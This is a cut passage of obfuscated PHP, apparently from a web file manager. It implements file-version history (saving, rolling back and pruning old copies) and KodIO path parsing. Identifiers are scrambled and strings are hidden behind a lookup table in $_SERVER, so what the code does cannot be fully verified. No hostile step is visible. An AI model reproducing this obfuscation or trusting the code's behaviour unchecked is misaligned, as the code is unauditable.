$îÅæ‚‰Ô = self::listData($Ô£ìÁ¡å); $ËÄ³¨øû = rtrim($ãñô†›’, $ğÌ îŠ[8]) . $ğÌ îŠ[8] . ($Àóê†Æ­ ? $Àóê†Æ­ : get_path_this($Ô£ìÁ¡å)); $ı‘ååšÒ = self::listData($ËÄ³¨øû); if ($îÅæ‚‰Ô && $îÅæ‚‰Ô[$ğÌ îŠ[446]] && $ı‘ååšÒ && $ı‘ååšÒ[$ğÌ îŠ[446]]) { return self::clear($Ô£ìÁ¡å); } if ($îÅæ‚‰Ô && $îÅæ‚‰Ô[$ğÌ îŠ[446]]) { self::moveHistory($Ô£ìÁ¡å, $Àóê†Æ­, $À¥Ù¨üñ); } } else { IO::move($š¤ºøæñ[$ğÌ îŠ[87]], $À¥Ù¨üñ, !1, $Àóê†Æ­); self::clearEmptyFolder(IO::pathFather($š¤ºøæñ[$ğÌ îŠ[87]])); } } public static function eventAfterRemove($Ó…Å½ü¢, $¸¡æë‡€) { $Ê•âÓˆ› =& $_SERVER[¹Éµ„ºå]; if (!$¸¡æë‡€) { return; } $µƒ²ÀÔÎ = self::parsePath($Ó…Å½ü¢[0]); if (!$µƒ²ÀÔÎ) { return; } $Ô–„¨Î° = self::checkInHistory($µƒ²ÀÔÎ); if (!$Ô–„¨Î°) { return; } if ($Ô–„¨Î°[$Ê•âÓˆ›[33]] == $Ê•âÓˆ›[230]) { $”˜®¸‘  = self::listData($µƒ²ÀÔÎ, !1); if ($”˜®¸‘  && $”˜®¸‘ [$Ê•âÓˆ›[446]]) { self::clear($µƒ²ÀÔÎ, !1); } } else { IO::remove($Ô–„¨Î°[$Ê•âÓˆ›[87]]); self::clearEmptyFolder(IO::pathFather($Ô–„¨Î°[$Ê•âÓˆ›[87]])); } } private static function checkInHistory($ÅĞÒãá‰) { $Òáºô = self::pathHistory($ÅĞÒãá‰); if (!IO::exist($Òáºô)) { $Òáºô .= $_SERVER[¹Éµ„ºå][1410]; } return IO::exist($Òáºô) ? IO::info($Òáºô) : !1; } private static function parsePath($Ëù°™ °) { $ßË™™×³ =& $_SERVER[¹Éµ„ºå]; if (!$Ëù°™ °) { return !1; } if (isset($GLOBALS[$ßË™™×³[1411]]) && $GLOBALS[$ßË™™×³[1411]]) { return; } $ÃìÒÖÙ— = KodIO::parse($Ëù°™ °); $ôÉµ…Ñé = $ÃìÒÖÙ—[$ßË™™×³[33]]; $ıËÕÈÏö = !$ôÉµ…Ñé || $ôÉµ…Ñé == KodIO::KOD_IO || $ôÉµ…Ñé == KodIO::KOD_SHARE_ITEM; if (!$ıËÕÈÏö || !$ÃìÒÖÙ—[$ßË™™×³[1412]]) { return !1; } if (substr($Ëù°™ °, 0, strlen(DATA_PATH . $ßË™™×³[1413])) == DATA_PATH . $ßË™™×³[1413]) { return !1; } if ($ôÉµ…Ñé == KodIO::KOD_SHARE_ITEM) { $–°ƒ¿â = IO::init($Ëù°™ °); if ($–°ƒ¿â->pathParse[$ßË™™×³[1326]]) { return self::parsePath($–°ƒ¿â->pathParse[$ßË™™×³[1326]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $æ•Ä´å¶ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ßË™™×³[1414]); foreach ($æ•Ä´å¶ as $å¢¡Æ£) { if (!$ôÉµ…Ñé && substr($Ëù°™ °, 0, strlen($å¢¡Æ£)) == $å¢¡Æ£) { return !1; } } self::log($GLOBALS[$ßË™™×³[1320]] . $ßË™™×³[1415] . $Ëù°™ °); return $Ëù°™ °; } private static function pathHistory($À­Û¢¼) { $¬¥°ß˜‚ =& $_SERVER[¹Éµ„ºå]; $ÂÊøÂ‰´ = self::$_historyBase . ltrim(KodIO::clear($À­Û¢¼), $¬¥°ß˜‚[8]); $ÂÊøÂ‰´ = str_replace(array($¬¥°ß˜‚[1416]), array($¬¥°ß˜‚[1417]), $ÂÊøÂ‰´); return $ÂÊøÂ‰´; } public static function log($şÂàº…‡) { } public static function historyCount($Ã–âô¤Ã) { $Òä—ˆ¾ó =& $_SERVER[¹Éµ„ºå]; $ŠŞ¡õöí = array(); $¹Í¸À = array(); foreach ($Ã–âô¤Ã as $œ‡¥¤ Ü) { $ê—–µôö = get_path_father($œ‡¥¤ Ü); if (!$¹Í¸À[$ê—–µôö]) { $¹Í¸À[$ê—–µôö] = array(); } $¹Í¸À[$ê—–µôö][] = get_path_this($œ‡¥¤ Ü); } foreach ($¹Í¸À as $ê—–µôö => $Íş»âî) { $×«†üŒİ = self::parsePath($ê—–µôö); if (!$×«†üŒİ) { continue; } foreach ($Íş»âî as $¾·ò¶») { $’è²ïİ‘ = self::listData(rtrim($×«†üŒİ, $Òä—ˆ¾ó[8]) . $Òä—ˆ¾ó[8] . $¾·ò¶», !1); if ($’è²ïİ‘ && $’è²ïİ‘[$Òä—ˆ¾ó[446]]) { $ŠŞ¡õöí[rtrim($ê—–µôö, $Òä—ˆ¾ó[8]) . $Òä—ˆ¾ó[8] . $¾·ò¶»] = count($’è²ïİ‘[$Òä—ˆ¾ó[446]]); } } } return $ŠŞ¡õöí; } public static function add($¤¢¯éŞÀ) { $‚–÷éÙ× =& $_SERVER[¹Éµ„ºå]; $İÊ…ä ó = self::listData($¤¢¯éŞÀ); if (!$İÊ…ä ó) { return; } $Šıöå¡ = Model($‚–÷éÙ×[864])->get($‚–÷éÙ×[952]); $»†ûìÀÛ = intval($GLOBALS[$‚–÷éÙ×[6]][$‚–÷éÙ×[92]][$‚–÷éÙ×[1396]]); $ ¹•Ì¯ó = $Šıöå¡ == $‚–÷éÙ×[953] ? min(5, $»†ûìÀÛ) : $»†ûìÀÛ; if ($»†ûìÀÛ <= 0) { return; } $Ò™ìçå¦ = IO::info($¤¢¯éŞÀ); $«››ÄçĞ = $İÊ…ä ó[$‚–÷éÙ×[446]]; if ($Ò™ìçå¦[$‚–÷éÙ×[79]] == 0) { return; } if ($Ò™ìçå¦[$‚–÷éÙ×[79]] >= 1024 * 1024 * 500) { return !1; } $õö÷øË• = IO::hashSimple($¤¢¯éŞÀ); if ($«››ÄçĞ && $«››ÄçĞ[0][$‚–÷éÙ×[694]] == $õö÷øË•) { return !0; } if (array_key_exists($‚–÷éÙ×[233], $Ò™ìçå¦) && !$Ò™ìçå¦[$‚–÷éÙ×[233]]) { return !1; } $âö½±Şø = short_id(time()); $È™´­Í = array($‚–÷éÙ×[487] => $âö½±Şø, $‚–÷éÙ×[694] => $õö÷øË•, $‚–÷éÙ×[32] => $Ò™ìçå¦[$‚–÷éÙ×[32]] . $‚–÷éÙ×[10] . date($‚–÷éÙ×[1418]) . rand_string(1), $‚–÷éÙ×[79] => $Ò™ìçå¦[$‚–÷éÙ×[79]], $‚–÷éÙ×[541] => USER_ID, $‚–÷éÙ×[231] => time(), $‚–÷éÙ×[1419] => $‚–÷éÙ×[12]); IO::mkdir($İÊ…ä ó[$‚–÷éÙ×[1420]]); $õåÁƒÜ = IO::copy($¤¢¯éŞÀ, $İÊ…ä ó[$‚–÷éÙ×[1420]], !1, $È™´­Í[$‚–÷éÙ×[32]]); if (!$õåÁƒÜ) { self::clearEmptyFolder($İÊ…ä ó[$‚–÷éÙ×[1420]]); return !1; } array_unshift($«››ÄçĞ, $È™´­Í); if (count($«››ÄçĞ) > $ ¹•Ì¯ó) { $´Ë±±Å‹ = array_slice($«››ÄçĞ, $ ¹•Ì¯ó); foreach ($´Ë±±Å‹ as $şÙÄÄàş) { IO::remove($İÊ…ä ó[$‚–÷éÙ×[1420]] . $şÙÄÄàş[$‚–÷éÙ×[32]]); } $«››ÄçĞ = array_slice($«››ÄçĞ, 0, $ ¹•Ì¯ó); } return self::saveData($İÊ…ä ó[$‚–÷éÙ×[1421]], $«››ÄçĞ); } public static function remove($ŸË“ºïƒ, $“ó™™â¨) { $ãİçë =& $_SERVER[¹Éµ„ºå]; $…º¬¶†¯ = self::listData($ŸË“ºïƒ); $¨›©ßÃ§ = array(); if (!$…º¬¶†¯) { return !1; } foreach ($…º¬¶†¯[$ãİçë[446]] as $Îê¬‡£Æ) { if ($Îê¬‡£Æ[$ãİçë[487]] == $“ó™™â¨) { IO::remove($…º¬¶†¯[$ãİçë[1420]] . $Îê¬‡£Æ[$ãİçë[32]]); continue; } $¨›©ßÃ§[] = $Îê¬‡£Æ; } return self::saveData($…º¬¶†¯[$ãİçë[1421]], $¨›©ßÃ§); } public static function clear($İå², $ß¨‘ÒÑ• = true) { $¦Éíœ×¿ =& $_SERVER[¹Éµ„ºå]; $Šî±†ıø = self::listData($İå², $ß¨‘ÒÑ•); if (!$Šî±†ıø) { return !1; } foreach ($Šî±†ıø[$¦Éíœ×¿[446]] as $–´—°â) { IO::remove($Šî±†ıø[$¦Éíœ×¿[1420]] . $–´—°â[$¦Éíœ×¿[32]]); } return self::saveData($Šî±†ıø[$¦Éíœ×¿[1421]], array()); } public static function moveHistory($ãó„áµ˜, $·ª×—Œì = '', $ß•°š€ = '') { $Â«’á¼ú =& $_SERVER[¹Éµ„ºå]; $¡š¼› = self::listData($ãó„áµ˜, !1); if (!$¡š¼› || !$¡š¼›[$Â«’á¼ú[446]]) { return !1; } $ÕŞ…Ææ = $Â«’á¼ú[1410]; $·ª×—Œì = $·ª×—Œì ? $·ª×—Œì : get_path_this($ãó„áµ˜); $ß•°š€ = $ß•°š€ ? $ß•°š€ : $¡š¼›[$Â«’á¼ú[1420]]; $…â¼·í° = substr(get_path_this($¡š¼›[$Â«’á¼ú[1421]]), 0, -strlen($ÕŞ…Ææ)); foreach ($¡š¼›[$Â«’á¼ú[446]] as $™·À°§É => $‚² ³š˜) { $µ²Œ½Í˜ = $·ª×—Œì . substr($‚² ³š˜[$Â«’á¼ú[32]], strlen($…â¼·í°)); $­´ø–Ç = IO::move($¡š¼›[$Â«’á¼ú[1420]] . $‚² ³š˜[$Â«’á¼ú[32]], $ß•°š€, !1, $µ²Œ½Í˜); if ($­´ø–Ç) { $¡š¼›[$Â«’á¼ú[446]][$™·À°§É][$Â«’á¼ú[32]] = $µ²Œ½Í˜; } } $¡š¼›[$Â«’á¼ú[1421]] = IO::move($¡š¼›[$Â«’á¼ú[1421]], $ß•°š€, !1, $·ª×—Œì . $ÕŞ…Ææ); self::saveData($¡š¼›[$Â«’á¼ú[1421]], $¡š¼›[$Â«’á¼ú[446]]); self::clearEmptyFolder($¡š¼›[$Â«’á¼ú[1420]]); } public static function rollback($È¯£, $Ù±ƒˆÀ´) { $Ç›­Ú¼Æ =& $_SERVER[¹Éµ„ºå]; $Ç¶Îû¦à = self::listData($È¯£); if (!$Ç¶Îû¦à) { return; } $–¿™º°µ = IO::info($È¯£); foreach ($Ç¶Îû¦à[$Ç›­Ú¼Æ[446]] as $±Û®Ö¶ => $—ìÆ»ãà) { if ($—ìÆ»ãà[$Ç›­Ú¼Æ[487]] == $Ù±ƒˆÀ´) { self::add($È¯£); $ ©ˆŸè° = $Ç¶Îû¦à[$Ç›­Ú¼Æ[1420]] . $—ìÆ»ãà[$Ç›­Ú¼Æ[32]]; $¥š–ä»ƒ = IO::copy($ ©ˆŸè°, IO::pathFather($È¯£), REPEAT_REPLACE, $–¿™º°µ[$Ç›­Ú¼Æ[32]]); if ($¥š–ä»ƒ) { self::remove($È¯£, $Ù±ƒˆÀ´); } return $¥š–ä»ƒ; } } return !1; } public static function setDetail($€©™ú¹‚, $‹àèÔ™ë, $Æ—¯Ûœ¶) { $ÉåÁ»àÜ =& $_SERVER[¹Éµ„ºå]; $„ØÄá³ğ = self::listData($€©™ú¹‚); if (!$„ØÄá³ğ) { return; } foreach ($„ØÄá³ğ[$ÉåÁ»àÜ[446]] as $œÓ ¡ÜÃ => $ê×²¤şÎ) { if ($ê×²¤şÎ[$ÉåÁ»àÜ[487]] == $‹àèÔ™ë) { $„ØÄá³ğ[$ÉåÁ»àÜ[446]][$œÓ ¡ÜÃ][$ÉåÁ»àÜ[1419]] = $Æ—¯Ûœ¶; self::saveData($„ØÄá³ğ[$ÉåÁ»àÜ[1421]], $„ØÄá³ğ[$ÉåÁ»àÜ[446]]); return !0; } } return !1; } public static function fileInfo($œ³†Æª, $²ÑÑöüö) { $äö³Ğ·É =& $_SERVER[¹Éµ„ºå]; $Âè½­Ï = self::listData($œ³†Æª); if (!$Âè½­Ï) { show_json(LNG($äö³Ğ·É[105]), !1); } $ÉÒßíÂ = $äö³Ğ·É[12]; foreach ($Âè½­Ï[$äö³Ğ·É[446]] as $­ÃáÖïÛ => $¿Â§²Şú) { if ($¿Â§²Şú[$äö³Ğ·É[487]] != $²ÑÑöüö) { continue; } $ÉÒßíÂ = $Âè½­Ï[$äö³Ğ·É[1420]] . $¿Â§²Şú[$äö³Ğ·É[32]]; break; } if (!$ÉÒßíÂ) { show_json(LNG($äö³Ğ·É[105]), !1); } return IO::info($ÉÒßíÂ); } public static function fileOut($ïï±ŠĞ•, $ˆ™¤Ê™Á, $˜„ªãÔ = false) { $›Æç›«Ì =& $_SERVER[¹Éµ„ºå]; $ö¼Şß = self::fileInfo($ïï±ŠĞ•, $ˆ™¤Ê™Á); $”çÅÓ³ =& $GLOBALS[$›Æç›«Ì[7]]; $˜„ªãÔ = isset($”çÅÓ³[$›Æç›«Ì[1374]]) && $”çÅÓ³[$›Æç›«Ì[1374]] == 1; if (isset($”çÅÓ³[$›Æç›«Ì[33]]) && $”çÅÓ³[$›Æç›«Ì[33]] == $›Æç›«Ì[1422]) { return IO::fileOutImage($ö¼Şß[$›Æç›«Ì[87]], $”çÅÓ³[$›Æç›«Ì[1423]]); } IO::fileOut($ö¼Şß[$›Æç›«Ì[87]], $˜„ªãÔ, get_path_this($ïï±ŠĞ•)); } public static function listData($ğ…„ıâ†, $ŒšŒë = true) { $Ÿ±ĞŒ­Ö =& $_SERVER[¹Éµ„ºå]; if ($ŒšŒë && !IO::exist($ğ…„ıâ†)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ğ…„ıâ†, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¬§¸«Ù = self::pathHistory($ğ…„ıâ†); $ƒÄÊò¡ = array($Ÿ±ĞŒ­Ö[1421] => $¬§¸«Ù . $Ÿ±ĞŒ­Ö[1410], $Ÿ±ĞŒ­Ö[1420] => rtrim(get_path_father($¬§¸«Ù), $Ÿ±ĞŒ­Ö[8]) . $Ÿ±ĞŒ­Ö[8], $Ÿ±ĞŒ­Ö[446] => array()); $šÅÇÏ…Ğ = IO::getContent($ƒÄÊò¡[$Ÿ±ĞŒ­Ö[1421]]); if ($šÅÇÏ…Ğ) { $­²¨–¦ = json_decode($šÅÇÏ…Ğ, !0); if (is_array($­²¨–¦)) { $ƒÄÊò¡[$Ÿ±ĞŒ­Ö[446]] = $­²¨–¦; } } return $ƒÄÊò¡; } private static function saveData($›€‚×ÇŞ, $„¢Õìú) { $í½¦©–† =& $_SERVER[¹Éµ„ºå]; self::log($í½¦©–†[1424] . $›€‚×ÇŞ . $í½¦©–†[74] . count($„¢Õìú), $í½¦©–†[843]); if ($„¢Õìú) { return IO::setContent($›€‚×ÇŞ, json_encode($„¢Õìú)); } $Æ‰’æù = IO::pathFather($›€‚×ÇŞ); IO::remove($›€‚×ÇŞ); self::clearEmptyFolder($Æ‰’æù); return !0; } public static function clearEmptyFolder($ÓÊ‰ŠØ) { $÷ÏİáõÀ =& $_SERVER[¹Éµ„ºå]; if (trim($ÓÊ‰ŠØ, $÷ÏİáõÀ[8]) == trim(self::$_historyBase, $÷ÏİáõÀ[8])) { return; } $¹ù´´° = IO::pathFather($ÓÊ‰ŠØ); $Ò¹ä¥ = IO::has($ÓÊ‰ŠØ, !0); if ($Ò¹ä¥[$÷ÏİáõÀ[239]] > 0 || $Ò¹ä¥[$÷ÏİáõÀ[240]] > 0) { return; } IO::remove($ÓÊ‰ŠØ); self::clearEmptyFolder($¹ù´´°); } private static function getBasePath() { $´ÆŒÕ—Œ =& $_SERVER[¹Éµ„ºå]; $¢Š ù¶™ = Model($´ÆŒÕ—Œ[1425])->get($´ÆŒÕ—Œ[1426]); if ($¢Š ù¶™) { if (!IO::exist($¢Š ù¶™)) { IO::mkdir($¢Š ù¶™); } if (get_path_this($¢Š ù¶™) == $´ÆŒÕ—Œ[1413]) { $úõµ¤« = $´ÆŒÕ—Œ[1427] . rand_string(8); @rename($¢Š ù¶™, get_path_father($¢Š ù¶™) . $´ÆŒÕ—Œ[8] . $úõµ¤«); $¢Š ù¶™ = DATA_PATH . $úõµ¤« . $´ÆŒÕ—Œ[8]; file_put_contents(DATA_PATH . $´ÆŒÕ—Œ[1362], $´ÆŒÕ—Œ[12]); Model($´ÆŒÕ—Œ[1425])->set($´ÆŒÕ—Œ[1426], $¢Š ù¶™); } return $¢Š ù¶™; } $¢Š ù¶™ = DATA_PATH . $´ÆŒÕ—Œ[1427] . rand_string(8) . $´ÆŒÕ—Œ[8]; $¢Š ù¶™ = IO::mkdir($¢Š ù¶™); $¢Š ù¶™ = rtrim($¢Š ù¶™, $´ÆŒÕ—Œ[8]) . $´ÆŒÕ—Œ[8]; file_put_contents($¢Š ù¶™ . $´ÆŒÕ—Œ[1362], $´ÆŒÕ—Œ[12]); file_put_contents(DATA_PATH . $´ÆŒÕ—Œ[1362], $´ÆŒÕ—Œ[12]); Model($´ÆŒÕ—Œ[1425])->set($´ÆŒÕ—Œ[1426], $¢Š ù¶™); return $¢Š ù¶™; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\122\145\143\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\x73\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\x69\154\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\106\x69\x6c\145\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\x70\122\x6f\x6f\164\123\145\154\x66\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\123\x68\141\x72\145\114\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\x65\111\164\145\x6d\x4c\151\156\153\175"; const KOD_SHARE_OUTER = "\173\x73\x68\141\162\x65\111\x74\145\155\117\165\164\x7d"; const KOD_SEARCH = "\173\163\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\x63\x6b\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\x52\145\156\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\151\166\x65\162\175"; public static function typeList() { $½÷¤¨‚± =& $_SERVER[¹Éµ„ºå]; return array($½÷¤¨‚±[1428] => self::KOD_SOURCE, $½÷¤¨‚±[1429] => self::KOD_USER_RECYCLE, $½÷¤¨‚±[1430] => self::KOD_USER_FAV, $½÷¤¨‚±[1431] => self::KOD_USER_FILE_TAG, $½÷¤¨‚±[1432] => self::KOD_USER_FILE_TYPE, $½÷¤¨‚±[1433] => self::KOD_GROUP_ROOT_SELF, $½÷¤¨‚±[1434] => self::KOD_USER_SHARE, $½÷¤¨‚±[1435] => self::KOD_USER_SHARE_LINK, $½÷¤¨‚±[1436] => self::KOD_USER_SHARE_TO_ME, $½÷¤¨‚±[1437] => self::KOD_SHARE_ITEM, $½÷¤¨‚±[1438] => self::KOD_SHARE_LINK, $½÷¤¨‚±[1439] => self::KOD_SHARE_OUTER, $½÷¤¨‚±[1440] => self::KOD_SEARCH, $½÷¤¨‚±[1441] => self::KOD_BLOCK, $½÷¤¨‚±[1442] => self::KOD_IO, $½÷¤¨‚±[1443] => self::KOD_USER_RECENT, $½÷¤¨‚±[1444] => self::KOD_USER_DRIVER); } public static function parse($ÏÊ ë«) { $´ıô˜Ü =& $_SERVER[¹Éµ„ºå]; $ÏÊ ë« = self::clear($ÏÊ ë«); $ş†õŞÈí = array_values(self::typeList()); preg_match($´ıô˜Ü[1445], $ÏÊ ë«, $ºŒ™³¦µ); $»¶ÛçÂ´ = array($´ıô˜Ü[511] => !1, $´ıô˜Ü[1446] => !1, $´ıô˜Ü[508] => !1, $´ıô˜Ü[87] => $ÏÊ ë«, $´ıô˜Ü[1346] => !1, $´ıô˜Ü[1345] => $´ıô˜Ü[12]); if (is_array($ºŒ™³¦µ) && count($ºŒ™³¦µ) == 5) { $½ƒ«í° = $´ıô˜Ü[1447] . $ºŒ™³¦µ[2] . $´ıô˜Ü[402]; if (in_array($½ƒ«í°, $ş†õŞÈí)) { $»¶ÛçÂ´[$´ıô˜Ü[1346]] = $ºŒ™³¦µ[1]; $»¶ÛçÂ´[$´ıô˜Ü[33]] = $½ƒ«í°; $»¶ÛçÂ´[$´ıô˜Ü[1448]] = substr($½ƒ«í°, 1, -1); $»¶ÛçÂ´[$´ıô˜Ü[487]] = $ºŒ™³¦µ[3]; } $»¶ÛçÂ´[$´ıô˜Ü[1345]] = $ºŒ™³¦µ[4]; } if ($»¶ÛçÂ´[$´ıô˜Ü[511]] == self::KOD_SOURCE) { $»¶ÛçÂ´[$´ıô˜Ü[487]] = intval($»¶ÛçÂ´[$´ıô˜Ü[487]]); $»¶ÛçÂ´[$´ıô˜Ü[1349]] = $»¶ÛçÂ´[$´ıô˜Ü[487]]; } $íéø¸šÊ = array($´ıô˜Ü[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $»¶ÛçÂ´[$´ıô˜Ü[1412]] = in_array($»¶ÛçÂ´[$´ıô˜Ü[33]], $íéø¸šÊ); return $»¶ÛçÂ´; } public static function isTruePath($ıû™ôÑ®) { $˜—‡îÄÖ =& $_SERVER[¹Éµ„ºå]; if (substr($ıû™ôÑ®, 0, 1) != $˜—‡îÄÖ[1447]) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[498]) === 0) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[1416]) === 0) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[1449]) === 0) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[1450]) === 0) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[1451]) === 0) { return !0; } if (strpos($ıû™ôÑ®, $˜—‡îÄÖ[1452]) === 0) { return !0; } return !1; } public static function clear($À¤±Æ“) { $•Õ¢¦à­ =& $_SERVER[¹Éµ„ºå]; $À¤±Æ“ = str_replace(array($•Õ¢¦à­[1239], $•Õ¢¦à­[285]), $•Õ¢¦à­[53], $À¤±Æ“); $À¤±Æ“ = str_replace($•Õ¢¦à­[97], $•Õ¢¦à­[8], $À¤±Æ“); $³¡€œàş = $•Õ¢¦à­[1453]; if (substr($À¤±Æ“, 0, 3) == $•Õ¢¦à­[1454]) { $À¤±Æ“ = substr($À¤±Æ“, 3); } while (strstr($À¤±Æ“, $³¡€œàş)) { $À¤±Æ“ = str_replace($³¡€œàş, $•Õ¢¦à­[8], $À¤±Æ“); } $À¤±Æ“ = preg_replace($•Õ¢¦à­[1455], $•Õ¢¦à­[8], $À¤±Æ“); if ($À¤±Æ“ == $•Õ¢¦à­[8]) { return $•Õ¢¦à­[8]; } $À¤±Æ“ = rtrim($À¤±Æ“, $•Õ¢¦à­[8]); return $À¤±Æ“; } public static function pathTrue($«¡ÂèÑ²) { $¶µÌã­ß =& $_SERVER[¹Éµ„ºå]; if (!$«¡ÂèÑ²) { return $¶µÌã­ß[12]; } $«¡ÂèÑ² = str_replace($¶µÌã­ß[254], $¶µÌã­ß[8], str_replace($¶µÌã­ß[1456], $¶µÌã­ß[8], $«¡ÂèÑ²)); $«¡ÂèÑ² = str_replace($¶µÌã­ß[254], $¶µÌã­ß[8], str_replace($¶µÌã­ß[1456], $¶µÌã­ß[8], $«¡ÂèÑ²)); if (!strstr($«¡ÂèÑ², $¶µÌã­ß[1454])) { return $«¡ÂèÑ²; } $”ôõ›Ö = explode($¶µÌã­ß[8], $«¡ÂèÑ²); foreach ($”ôõ›Ö as $»–„©İÓ => $Ğ¢·ğÎ) { if ($Ğ¢·ğÎ !== $¶µÌã­ß[1457]) { continue; } for ($ÂÇÓ†Ä = $»–„©İÓ; $ÂÇÓ†Ä >= 0; $ÂÇÓ†Ä--) { if ($”ôõ›Ö[$ÂÇÓ†Ä] === $¶µÌã­ß[10] || $”ôõ›Ö[$ÂÇÓ†Ä] === $¶µÌã­ß[1457] || $”ôõ›Ö[$ÂÇÓ†Ä] === -1) { continue; } if ($”ôõ›Ö[$ÂÇÓ†Ä] === $¶µÌã­ß[12]) { $”ôõ›Ö[$»–„©İÓ] = -1; break; } $”ôõ›Ö[$»–„©İÓ] = -1; $”ôõ›Ö[$ÂÇÓ†Ä] = -1; break; } } $ú¨ˆÒ£ = array(); foreach ($”ôõ›Ö as $Ğ¢·ğÎ) { if ($Ğ¢·ğÎ !== -1) { $ú¨ˆÒ£[] = $Ğ¢·ğÎ; } } $ÕèáÍŸ² = implode($¶µÌã­ß[8], $ú¨ˆÒ£); if (strpos($ÕèáÍŸ², $¶µÌã­ß[1458]) === 0) { $ÕèáÍŸ² = $¶µÌã­ß[1454] . substr($ÕèáÍŸ², strlen($¶µÌã­ß[1458])); } return $ÕèáÍŸ²; } public static function pathUrlClear($ ‹ùÙÊÛ) { $¬ÊñÉ÷¶ =& $_SERVER[¹Éµ„ºå]; if (!$ ‹ùÙÊÛ) { return $ ‹ùÙÊÛ; } $ ‹ùÙÊÛ = rawurldecode($ ‹ùÙÊÛ); $ ‹ùÙÊÛ = str_replace($¬ÊñÉ÷¶[1456], $¬ÊñÉ÷¶[8], $ ‹ùÙÊÛ); if (strpos($ ‹ùÙÊÛ, $¬ÊñÉ÷¶[76]) > 0) { $ ‹ùÙÊÛ = substr($ ‹ùÙÊÛ, 0, strpos($ ‹ùÙÊÛ, $¬ÊñÉ÷¶[76])); } if (strpos($ ‹ùÙÊÛ, $¬ÊñÉ÷¶[1459]) > 0) { $ ‹ùÙÊÛ = substr($ ‹ùÙÊÛ, 0, strpos($ ‹ùÙÊÛ, $¬ÊñÉ÷¶[1459])); } return $ ‹ùÙÊÛ; } public static function sourceID($®³Ğ›™ğ) { $¤ÉÁÊÏÍ =& $_SERVER[¹Éµ„ºå]; $ô«ŠÏ÷Ï = self::parse($®³Ğ›™ğ); if ($ô«ŠÏ÷Ï[$¤ÉÁÊÏÍ[33]] !== self::KOD_SOURCE) { show_json(LNG($¤ÉÁÊÏÍ[1460]), !1); } return $ô«ŠÏ÷Ï[$¤ÉÁÊÏÍ[487]]; } public static function make($ë–Öèı›) { if (!$ë–Öèı›) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ë–Öèı›)); } public static function makeShare($•‡Ú£ •, $–«şé¬İ) { return self::makePath(self::KOD_SHARE_ITEM, $•‡Ú£ •, $–«şé¬İ); } public static function makeFileTypePath($·«Æ«–Ä) { return self::makePath(self::KOD_USER_FILE_TYPE, $·«Æ«–Ä); } public static function makeFileTagPath($şÎ™ê…ë) { return self::makePath(self::KOD_USER_FILE_TAG, $şÎ™ê…ë); } public static function makePath($š»ŞíùÏ, $¾©ğ£ = '', $³½¿Íˆ = '') { $©Ö¿ÔØ =& $_SERVER[¹Éµ„ºå]; $¬Ò‡…‰ñ = substr($š»ŞíùÏ, 1, -1); $ıí´æ¦ = $©Ö¿ÔØ[1461] . $¬Ò‡…‰ñ . $©Ö¿ÔØ[1462] . $¾©ğ£ . $©Ö¿ÔØ[1463]; $ıí´æ¦ = $³½¿Íˆ ? $ıí´æ¦ . $³½¿Íˆ . $©Ö¿ÔØ[8] : $ıí´æ¦; return $ıí´æ¦; } public static function hashPath($¤à˜¢úç, $ñ¸‘Ëœ› = false) { $ÔÛƒœ =& $_SERVER[¹Éµ„ºå]; if (!$¤à˜¢úç) { return $ÔÛƒœ[12]; } $ÎÚ¡¿š¶ = is_array($¤à˜¢úç) ? $¤à˜¢úç : IO::info($¤à˜¢úç); $®ÁÎÕà¶ = _get($ÎÚ¡¿š¶, $ÔÛƒœ[1464], $ÔÛƒœ[12]); if (!$®ÁÎÕà¶ && isset($ÎÚ¡¿š¶[$ÔÛƒœ[557]])) { $®ÁÎÕà¶ = $ÎÚ¡¿š¶[$ÔÛƒœ[557]]; } if (!$®ÁÎÕà¶ && isset($ÎÚ¡¿š¶[$ÔÛƒœ[235]])) { $®ÁÎÕà¶ = trim($ÎÚ¡¿š¶[$ÔÛƒœ[235]], $ÔÛƒœ[118]); } if ($®ÁÎÕà¶) { return $®ÁÎÕà¶; } if (!$®ÁÎÕà¶ && isset($ÎÚ¡¿š¶[$ÔÛƒœ[191]]) && $ÎÚ¡¿š¶[$ÔÛƒœ[191]]) { $ÎÚ¡¿š¶ = IO::info(KodIO::make($ÎÚ¡¿š¶[$ÔÛƒœ[191]])); $®ÁÎÕà¶ = _get($ÎÚ¡¿š¶, $ÔÛƒœ[1464], $ÔÛƒœ[12]); if (!$®ÁÎÕà¶ && isset($ÎÚ¡¿š¶[$ÔÛƒœ[557]])) { $®ÁÎÕà¶ = $ÎÚ¡¿š¶[$ÔÛƒœ[557]]; } } $èµÕ¶öÜ = md5($ÎÚ¡¿š¶[$ÔÛƒœ[87]] . $ÎÚ¡¿š¶[$ÔÛƒœ[79]] 